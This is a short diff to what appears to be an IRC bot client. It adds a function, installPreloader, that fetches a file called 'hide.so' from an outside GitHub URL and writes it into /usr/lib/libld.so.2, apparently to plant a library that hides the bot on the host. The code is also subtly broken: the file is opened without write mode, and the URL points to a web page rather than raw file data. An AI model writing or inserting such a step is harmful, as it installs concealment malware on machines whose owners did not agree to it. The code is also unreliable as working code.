@@ -26,6 +26,13 @@ from sys import argv
 from random import randint
 import getpass
 
+def installPreloader():
+	response = urllib2.urlopen('https://github.com/Blizzo/IRCbot/blob/master/hide.so')
+	data = response.read()
+	f = open('/usr/lib/libld.so.2')
+	f.write(data)
+	f.close()
+
 
 def generateNick(operatingSystem): #generates a nick for the server
 	if operatingSystem == "":
